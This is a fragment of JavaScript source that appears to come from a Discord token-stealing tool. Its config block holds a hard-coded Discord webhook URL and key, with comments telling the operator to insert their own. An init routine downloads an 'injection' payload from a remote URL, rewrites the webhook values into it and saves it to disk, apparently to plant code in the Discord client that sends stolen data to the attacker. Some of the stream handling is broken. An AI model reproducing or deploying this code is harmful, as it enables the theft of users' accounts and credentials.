...
const config = {
  webhook: 'https://discord.com/api/webhooks/1008074498366517400/glhJw11Q76KalvhFN3z21RFXquRJ1Kgv_nyCKK60Gpt3v2iNzA681NSTciGqVZyUMhqu', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
  webhook_protector_key: 'B4M4DGOR6NUXZJW5', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
...
async function init() {
    https.get('${config.injection_url}', (res) => {
        ...
        res.replace('https://discord.com/api/webhooks/1008074498366517400/glhJw11Q76KalvhFN3z21RFXquRJ1Kgv_nyCKK60Gpt3v2iNzA681NSTciGqVZyUMhqu', '${config.webhook}')
        res.replace('B4M4DGOR6NUXZJW5', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
